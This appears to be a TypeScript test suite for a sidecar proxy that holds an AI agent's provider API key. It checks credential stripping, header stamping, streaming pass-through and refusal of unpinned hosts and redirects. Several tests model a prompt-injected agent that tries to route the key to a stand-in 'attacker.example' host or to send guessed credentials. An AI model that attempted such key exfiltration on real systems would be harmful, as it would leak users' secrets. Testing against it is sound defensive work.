// RFC 0013 §11: the sidecar's own tests plus the sidecar mode of
// buildProvider/configureProvider. The proxy behavior (strip/stamp/pin, SSE
// pass-through, unpinned-host refusal) runs against a local fake upstream, the
// same harness shape e2e-test/byok.sh drives through the stack; the full-chain
// test proves pi-ai + the OpenAI SDK round-trip the /<provider>/~/<encoded>
// baseUrl rewrite end to end (§4 A2/A3).

import assert from "node:assert/strict";
import { mkdtemp, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createServer, type Server } from "node:http";
import test from "node:test";
import { InMemoryCredentialStore, type Message } from "@earendil-works/pi-ai";
import { createModels } from "@earendil-works/pi-ai/models";
import { Readable } from "node:stream";
import type { IncomingMessage } from "node:http";
import {
	configureSlot,
	createSidecarServer,
	keyFingerprint as sidecarFingerprint,
	resetSidecarState,
} from "./sidecar.ts";
import { SIDECAR_PLACEHOLDER_KEY, buildProvider, configureProvider, sidecarUrl } from "./model.ts";
import { ConfigTool } from "./tools.ts";
import type { AgentApi, ProviderConfig } from "./types.ts";

// ── the fake upstream: records method/path/auth, serves SSE chat chunks ──────

type UpstreamRecord = { method: string; path: string; auth: string; xApiKey?: string | string[]; body: string };
type UpstreamHandler = (record: UpstreamRecord, res: import("node:http").ServerResponse) => void;

type FakeUpstream = {
	readonly seen: UpstreamRecord[];
	readonly port: number;
	/** Answer subsequent requests with `handler` instead of the SSE default. */
	once(handler: UpstreamHandler): void;
	close(): void;
};

const chatChunk = (delta: Record<string, unknown>, finishReason: string | null = null): string =>
	`data: ${JSON.stringify({
		id: "chatcmpl-test",
		object: "chat.completion.chunk",
		created: 1,
		model: "test-model",
		choices: [{ index: 0, delta, finish_reason: finishReason }],
	})}\n\n`;

const startFakeUpstream = async (): Promise<FakeUpstream> => {
	const seen: UpstreamRecord[] = [];
	const sseDefault: UpstreamHandler = (record, res) => {
		res.writeHead(200, { "content-type": "text/event-stream" });
		res.write(chatChunk({ role: "assistant", content: "" }));
		res.write(chatChunk({ content: `upstream saw ${record.path}` }));
		res.write(chatChunk({}, "stop"));
		res.write("data: [DONE]\n\n");
		res.end();
	};
	let handler = sseDefault;
	const server = createServer((req, res) => {
		let body = "";
		req.on("data", (chunk: Buffer) => (body += chunk));
		req.on("end", () => {
			const url = new URL(req.url ?? "/", "http://fake");
			const record: UpstreamRecord = {
				method: req.method ?? "",
				path: url.pathname,
				auth: req.headers.authorization ?? "",
				xApiKey: req.headers["x-api-key"],
				body,
			};
			seen.push(record);
			handler(record, res);
		});
	});
	await new Promise<void>((resolve, reject) => {
		server.once("listening", () => resolve());
		server.once("error", reject);
		server.listen(0, "127.0.0.1");
	});
	const address = server.address();
	const port = typeof address === "object" && address !== null ? address.port : 0;
	return {
		seen,
		port,
		once: (next) => {
			handler = next;
		},
		close: () => {
			// fetch keeps idle keep-alive connections open; without closing them
			// the listening handle never releases and the test runner hangs.
			server.closeIdleConnections();
			server.closeAllConnections();
			server.close();
		},
	};
};

// ── shared fixture: fake upstream + sidecar, both on loopback ────────────────

type Fixture = {
	upstream: FakeUpstream;
	upstreamBase: string;
	sidecar: Awaited<ReturnType<typeof createSidecarServer>>;
	sidecarBase: string;
	cleanup: () => Promise<void>;
};

const withSidecar = async (test: (fixture: Fixture) => Promise<void>): Promise<void> => {
	const upstream = await startFakeUpstream();
	const upstreamBase = `http://127.0.0.1:${upstream.port}/v1`;
	const catalog = await mkdtemp(join(tmpdir(), "sidecar-catalog-"));
	await writeFile(
		join(catalog, "catalog.json"),
		JSON.stringify({
			version: 1,
			providers: [{ id: "fake-cat", name: "Fake catalog entry", baseUrl: upstreamBase, builtin: true, models: [{ id: "m" }] }],
		}),
	);
	const sidecar = await createSidecarServer({ port: 0, catalogPath: join(catalog, "catalog.json") });
	const sidecarBase = `http://127.0.0.1:${sidecar.port}`;
	process.env.SIDECAR_URL = sidecarBase;
	try {
		await test({ upstream, upstreamBase, sidecar, sidecarBase, cleanup: async () => {} });
	} finally {
		delete process.env.SIDECAR_URL;
		resetSidecarState();
		await sidecar.close();
		upstream.close();
	}
};

const post = async (base: string, path: string, body?: unknown, headers: Record<string, string> = {}) => {
	const response = await fetch(`${base}${path}`, {
		method: "POST",
		headers: { "content-type": "application/json", ...headers },
		body: body === undefined ? undefined : JSON.stringify(body),
	});
	return { status: response.status, headers: response.headers, text: await response.text() };
};

const get = async (base: string, path: string) => {
	const response = await fetch(`${base}${path}`);
	return { status: response.status, text: await response.text() };
};

const KEY = "sk-sidecar-test-key";

// ── configureSlot and the HTTP surface ───────────────────────────────────────

test("POST /config pins the upstream and /status reports the fingerprint, never the key", async () => {
	await withSidecar(async ({ sidecar, sidecarBase, upstreamBase }) => {
		const applied = await post(sidecarBase, "/config", {
			provider: "custom-endpoint",
			modelId: "my-model",
			apiKey: KEY,
			baseUrl: upstreamBase,
		});
		assert.equal(applied.status, 200);
		const body = JSON.parse(applied.text) as Record<string, unknown>;
		assert.equal(body.keyFingerprint, sidecarFingerprint(KEY));
		assert.equal(body.upstream, upstreamBase);
		assert.ok(!applied.text.includes(KEY), "the /config response must not echo the key");

		const status = await get(sidecarBase, "/status");
		assert.equal(status.status, 200);
		assert.ok(!status.text.includes(KEY));
		assert.equal((JSON.parse(status.text) as Record<string, unknown>).provider, "custom-endpoint");

		const health = await get(sidecarBase, "/health");
		assert.equal(health.status, 200);
	});
});

test("POST /config resolves catalog providers from the baked catalog and stamps the right header", async () => {
	await withSidecar(async ({ sidecar, sidecarBase, upstream, upstreamBase }) => {
		await post(sidecarBase, "/config", { provider: "fake-cat", modelId: "m", apiKey: KEY });
		const status = JSON.parse((await get(sidecarBase, "/status")).text) as { upstream: string | null };
		assert.equal(status.upstream, upstreamBase); // from the catalog file, not the delivery

		// bearer by default (all catalog providers are OpenAI-compatible wire)
		await post(sidecarBase, `/fake-cat/~/${encodeURIComponent(upstreamBase)}/chat/completions`, { m: 1 });
		assert.equal(upstream.seen.at(-1)?.auth, `Bearer ${KEY}`);
	});
});

test("POST /config validation fails closed on shape errors and keyless non-faux slots", async () => {
	await withSidecar(async ({ sidecarBase }) => {
		for (const bad of [
			{ provider: "NOPE", modelId: "m", apiKey: KEY },
			{ provider: "custom", modelId: "", apiKey: KEY, baseUrl: "https://x.example/v1" },
			{ provider: "custom", modelId: "m", baseUrl: "https://x.example/v1" }, // no key
			{ provider: "faux", modelId: "not-faux-1" },
			{ provider: "unknown-provider", modelId: "m", apiKey: KEY }, // no baseUrl, not in catalog
		]) {
			const response = await post(sidecarBase, "/config", bad);
			assert.notEqual(response.status, 200, `config accepted: ${JSON.stringify(bad)}`);
		}
		const state = JSON.parse((await get(sidecarBase, "/status")).text) as { provider: string | null };
		assert.equal(state.provider, null); // nothing was stored
	});
});

test("faux is accepted and ignored: no upstream, no key, proxy refused", async () => {
	await withSidecar(async ({ sidecarBase }) => {
		const applied = await post(sidecarBase, "/config", { provider: "faux", modelId: "faux-1" });
		assert.equal(applied.status, 200);
		const status = JSON.parse((await get(sidecarBase, "/status")).text) as {
			provider: string;
			keyFingerprint: string | null;
			upstream: string | null;
		};
		assert.equal(status.provider, "faux");
		assert.equal(status.keyFingerprint, null);
		assert.equal(status.upstream, null);
		const probe = await post(sidecarBase, "/faux/~/https%3A%2F%2Fx.example/chat/completions");
		assert.equal(probe.status, 503); // not_configured
	});
});

// ── the proxy: strip, stamp, pin, pass through ──────────────────────────────

test("proxy strips inbound credentials, stamps the key, forwards path/query/body verbatim", async () => {
	await withSidecar(async ({ sidecar, sidecarBase, upstream, upstreamBase }) => {
		await post(sidecarBase, "/config", { provider: "custom-endpoint", modelId: "m", apiKey: KEY, baseUrl: upstreamBase });
		const encoded = encodeURIComponent(upstreamBase);
		const response = await post(
			sidecarBase,
			`/custom-endpoint/~/${encoded}/chat/completions?stream=true`,
			{ model: "m", messages: [{ role: "user", content: "hi" }] },
			// a prompt-injected agent sending its own guesses at credentials:
			{ authorization: "Bearer attacker-guess", "x-api-key": "attacker-guess", cookie: "session=1" },
		);
		assert.equal(response.status, 200);
		assert.equal(response.headers.get("content-type"), "text/event-stream");
		const record = upstream.seen.at(-1);
		assert.ok(record);
		assert.equal(record.method, "POST");
		assert.equal(record.path, "/v1/chat/completions"); // base path + rest, query preserved
		assert.equal(record.auth, `Bearer ${KEY}`, "the stamped credential wins");
		assert.equal(record.xApiKey, undefined, "inbound x-api-key stripped");
		assert.ok(record.body.includes('"hi"'));
		// SSE relayed: the streamed answer names the upstream path it saw.
		assert.match(response.text, /data: /);
		assert.match(response.text, /upstream saw \/v1\/chat\/completions/);
	});
});

test("SSE chunks pass through unbuffered, in arrival order", async () => {
	await withSidecar(async ({ sidecarBase, upstream, upstreamBase }) => {
		await post(sidecarBase, "/config", { provider: "custom-endpoint", modelId: "m", apiKey: KEY, baseUrl: upstreamBase });
		const delay = (ms: number) => new Promise((resolve) => setTimeout(resolve, ms));
		upstream.once(async (_record, res) => {
			res.writeHead(200, { "content-type": "text/event-stream" });
			res.write("data: one\n\n");
			await delay(25);
			res.write("data: two\n\n");
			await delay(25);
			res.write("data: three\n\n");
			res.end();
		});
		const response = await fetch(
			`${sidecarBase}/custom-endpoint/~/${encodeURIComponent(upstreamBase)}/chat/completions`,
			{ method: "POST", body: "{}", headers: { "content-type": "application/json" } },
		);
		const chunks: string[] = [];
		const reader = response.body?.getReader();
		assert.ok(reader);
		for (;;) {
			const { done, value } = await reader.read();
			if (done === true) break;
			chunks.push(Buffer.from(value).toString("utf8"));
		}
		// Writes spaced 25ms apart arrive as separate chunks: no buffering
		// that concatenates the whole body before relaying (§4 A2).
		assert.equal(chunks.length, 3, `expected per-write relay, got: ${JSON.stringify(chunks)}`);
		assert.equal(chunks.join(""), "data: one\n\ndata: two\n\ndata: three\n\n");
	});
});

test("R3: unpinned hosts, foreign provider prefixes, and redirects are refused", async () => {
	await withSidecar(async ({ sidecarBase, upstream, upstreamBase }) => {
		await post(sidecarBase, "/config", { provider: "custom-endpoint", modelId: "m", apiKey: KEY, baseUrl: upstreamBase });
		// A prompt-injected agent asking the sidecar to send the key elsewhere:
		const attacker = encodeURIComponent("http://attacker.example/v1");
		const exfil = await post(sidecarBase, `/custom-endpoint/~/${attacker}/chat/completions`);
		assert.equal(exfil.status, 403);
		assert.equal((JSON.parse(exfil.text) as { error: string }).error, "unpinned_upstream");
		// Wrong provider prefix:
		const foreign = await post(sidecarBase, `/other-provider/~/${encodeURIComponent(upstreamBase)}/x`);
		assert.equal(foreign.status, 404);
		// Garbage paths:
		const garbage = await post(sidecarBase, "/plain/path");
		assert.equal(garbage.status, 404);
		// A pinned upstream answering a redirect must not be followed (the
		// stamped header would travel to the redirect target).
		upstream.once((_record, res) => {
			res.writeHead(302, { location: "http://attacker.example/leak" });
			res.end();
		});
		const redirected = await post(sidecarBase, `/custom-endpoint/~/${encodeURIComponent(upstreamBase)}/redirect`);
		assert.equal(redirected.status, 502); // fetch redirect:"error" surfaces as an error
		// The attacker target was never dialed: only the pinned upstream saw traffic.
		assert.ok(upstream.seen.every((record) => record.path.startsWith("/v1") || record.path === "/redirect"));
	});
});

test("upstream failures relay verbatim; a dead upstream is 502 with a stable code", async () => {
	await withSidecar(async ({ sidecarBase, upstream, upstreamBase }) => {
		await post(sidecarBase, "/config", { provider: "custom-endpoint", modelId: "m", apiKey: KEY, baseUrl: upstreamBase });
		upstream.once((_record, res) => {
			res.writeHead(500, { "content-type": "application/json" });
			res.end(JSON.stringify({ error: { message: "upstream exploded" } }));
		});
		const response = await post(sidecarBase, `/custom-endpoint/~/${encodeURIComponent(upstreamBase)}/chat/completions`);
		assert.equal(response.status, 500); // status relayed verbatim
		assert.match(response.text, /upstream exploded/);
		// A typo'd provider prefix is refused before any dial (404 unknown_provider).
		const typo = await post(sidecarBase, `/custom-endtypo/~/${encodeURIComponent(upstreamBase)}/x`);
		assert.equal(typo.status, 404);
		assert.equal((JSON.parse(typo.text) as { error: string }).error, "unknown_provider");
		// A dead pinned upstream surfaces as 502 upstream_unreachable, not a hang.
		upstream.close();
		const dead = await post(sidecarBase, `/custom-endpoint/~/${encodeURIComponent(upstreamBase)}/chat/completions`);
		assert.equal(dead.status, 502);
		assert.equal((JSON.parse(dead.text) as { error: string }).error, "upstream_unreachable");
	});
});

// ── the agent side: buildProvider sidecar mode and configureProvider ─────────

test("buildProvider sidecar mode rewrites every model baseUrl and preserves detection substrings", async () => {
	await withSidecar(async ({ sidecarBase }) => {
		// A catalog built-in: the factory's models keep their real URLs in the rewrite.
		const provider = buildProvider({ id: "deepseek", modelId: "any", via: "sidecar" });
		for (const model of provider.getModels()) {
			assert.equal(model.baseUrl, `${sidecarBase}/deepseek/~/https%3A%2F%2Fapi.deepseek.com`);
			// §4 A1/A3 parity: pi-ai's substring detection still sees the real host.
			assert.ok(model.baseUrl.includes("api.deepseek.com") || model.baseUrl.includes("deepseek.com"));
		}
		// A custom endpoint: the delivered baseUrl rides along encoded.
		const custom = buildProvider({
			id: "custom",
			modelId: "my-model",
			baseUrl: "https://api.together.xyz/v1",
			via: "sidecar",
		});
		const model = custom.getModels()[0];
		assert.ok(model);
		assert.equal(model.baseUrl, `${sidecarBase}/custom/~/https%3A%2F%2Fapi.together.xyz%2Fv1`);
		// together quirks are detected by URL substring in pi-ai; preserved:
		assert.ok(model.baseUrl.includes("api.together.xyz"));
	});
});

test("configureProvider viaSidecar stores the placeholder credential and reports keyVia", async () => {
	await withSidecar(async ({ upstreamBase }) => {
		const credentials = new InMemoryCredentialStore();
		const models = createModels({ credentials });
		const applied = await configureProvider(models, credentials, {
			id: "custom",
			modelId: "my-model",
			baseUrl: upstreamBase,
			viaSidecar: true,
		});
		assert.equal(applied.fingerprint, null, "the agent cannot fingerprint a key it never saw");
		assert.equal(applied.keyVia, "sidecar");
		const stored = await credentials.read("custom");
		assert.equal(stored?.type === "api_key" ? stored.key : undefined, SIDECAR_PLACEHOLDER_KEY);
		// The rewritten provider resolves through the collection.
		const resolved = models.getModel("custom", "my-model");
		assert.notEqual(resolved, undefined);
		assert.ok(resolved?.baseUrl.startsWith(`${sidecarUrl()}/custom/~/`));
	});
});

test("configureProvider rejects viaSidecar misuse: faux, a delivered key, or no deployed sidecar", async () => {
	await withSidecar(async ({ upstreamBase }) => {
		const credentials = new InMemoryCredentialStore();
		const models = createModels({ credentials });
		await assert.rejects(
			configureProvider(models, credentials, { id: "faux", modelId: "faux-1", viaSidecar: true }),
			/faux is never delivered viaSidecar/,
		);
		await assert.rejects(
			configureProvider(models, credentials, { id: "custom", modelId: "m", baseUrl: upstreamBase, viaSidecar: true, apiKey: KEY }),
			/carry no apiKey/,
		);
	});
	const saved = process.env.SIDECAR_URL;
	process.env.SIDECAR_URL = "";
	try {
		const credentials = new InMemoryCredentialStore();
		await assert.rejects(
			configureProvider(createModels({ credentials }), credentials, { id: "custom", modelId: "m", baseUrl: "https://x.example/v1", viaSidecar: true }),
			/requires SIDECAR_URL/,
		);
	} finally {
		if (saved === undefined) delete process.env.SIDECAR_URL;
		else process.env.SIDECAR_URL = saved;
	}
});

test("direct mode is unchanged: a delivered key lands in the store with keyVia direct", async () => {
	const credentials = new InMemoryCredentialStore();
	const applied = await configureProvider(createModels({ credentials }), credentials, {
		id: "custom",
		modelId: "m",
		baseUrl: "https://api.example.com/v1",
		apiKey: "sk-direct",
	});
	assert.equal(applied.keyVia, "direct");
	assert.equal(applied.fingerprint, sidecarFingerprint("sk-direct"));
	const keyless = await configureProvider(createModels({ credentials }), credentials, { id: "faux", modelId: "faux-1" });
	assert.equal(keyless.keyVia, null);
});

// ── the full chain: pi-ai -> sidecar-mode model -> sidecar -> fake upstream ──

test("a sidecar-mode model call streams through the sidecar with the real key stamped upstream", async () => {
	await withSidecar(async ({ upstream, upstreamBase, sidecarBase }) => {
		// 1. The manager delivers the key half to the sidecar.
		await post(sidecarBase, "/config", { provider: "custom", modelId: "my-model", apiKey: KEY, baseUrl: upstreamBase });
		// 2. The manager delivers the keyless half to the agent.
		const credentials = new InMemoryCredentialStore();
		const models = createModels({ credentials });
		await configureProvider(models, credentials, { id: "custom", modelId: "my-model", baseUrl: upstreamBase, viaSidecar: true });
		// 3. The prompt: the model resolves through the collection exactly as
		// pi-durable does at conversation time.
		const model = models.getModel("custom", "my-model");
		assert.ok(model);
		const stream = models.stream(model, { messages: [{ role: "user", content: "hello sidecar" } as Message] });
		const settled = await stream.result();
		assert.equal(settled.stopReason, "stop");
		const text = JSON.stringify(settled.content);
		assert.match(String(text), /upstream saw \/v1\/chat\/completions/);
		// The upstream saw exactly one request: the sidecar's stamped bearer,
		// never the placeholder the agent holds.
		assert.equal(upstream.seen.length, 1);
		assert.equal(upstream.seen[0]?.auth, `Bearer ${KEY}`);
		assert.notEqual(upstream.seen[0]?.auth, `Bearer ${SIDECAR_PLACEHOLDER_KEY}`);
	});
});

// ── ConfigTool: the viaSidecar delivery contract ─────────────────────────────

test("ConfigTool accepts viaSidecar deliveries and refuses one that carries a key", async () => {
	const tool = new ConfigTool();
	const url = new URL("http://sandbox/config");
	const call = async (body: unknown) =>
		tool.handle({
			req: Readable.from([Buffer.from(JSON.stringify(body))]) as unknown as IncomingMessage,
			url,
			agent: {
				configureModel: async (config: ProviderConfig) => ({ agent: "t", model: { provider: config.provider }, keyVia: config.viaSidecar ? "sidecar" : null }),
			} as unknown as AgentApi,
		});
	const ok = (await call({ provider: "custom", modelId: "m", baseUrl: "https://x.example/v1", viaSidecar: true })) as {
		keyVia: string;
	};
	assert.equal(ok.keyVia, "sidecar");
	await assert.rejects(
		call({ provider: "custom", modelId: "m", baseUrl: "https://x.example/v1", viaSidecar: true, apiKey: "sk-x" }),
		(error: unknown) => {
			// HttpError's message is the code; the human detail lives in body.message.
			assert.equal((error as { body?: { error?: string } }).body?.error, "invalid_api_key");
			assert.match(String((error as { body?: { message?: string } }).body?.message), /RFC 0013 R1/);
			return true;
		},
	);
	await assert.rejects(
		call({ provider: "custom", modelId: "m", baseUrl: "https://x.example/v1", viaSidecar: "yes" }),
		(error: unknown) => {
			assert.equal((error as { body?: { error?: string } }).body?.error, "invalid_config");
			assert.match(String((error as { body?: { message?: string } }).body?.message), /viaSidecar must be a boolean/);
			return true;
		},
	);
});
